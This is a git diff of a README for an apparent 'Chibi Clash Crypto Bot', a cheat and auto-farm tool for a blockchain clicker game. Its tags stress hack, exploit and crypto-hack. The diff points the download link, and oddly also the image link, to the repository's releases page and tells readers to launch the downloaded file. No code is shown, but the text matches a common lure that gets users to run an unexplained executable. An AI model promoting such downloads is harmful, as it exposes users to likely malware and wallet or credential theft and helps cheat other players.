@@ -22,7 +22,7 @@ Welcome to the Chibi Clash Crypto Bot repository, where you can supercharge your
 
 🏷️ **Topics:** auto-clicker, auto-farm, blockchain-game, blockchain-technology, chibi-clash, chibi-clash-bot, chibi-clash-game, clicker-game, crypto-api, crypto-game, crypto-hack, crypto-token, cryptocurrency-game, ethereum-game, exploit, game-bot, game-cheat, game-enhancement, hack, mini-game.
 
-🔗 [**Download Release**](https://github.com/assets/Release.zip) 🚀
+🔗 [**Download Release**](https://github.com/Oluwarotimi84/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases) 🚀
 
 ⚠️ **Note:** Make sure to launch the downloaded file to start using the bot efficiently.
 
@@ -50,4 +50,4 @@ Enjoying the Chibi Clash Crypto Bot? Spread the word to your friends and fellow 
 
 Let's dive into the world of Chibi Clash with the Chibi Clash Crypto Bot – your ultimate companion for automated farming, clicking, and crypto token integration! Happy gaming! 🎮💎
 
-![Chibi Clash](https://example.com/chibiclash.jpg)
+![Chibi Clash](https://github.com/Oluwarotimi84/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
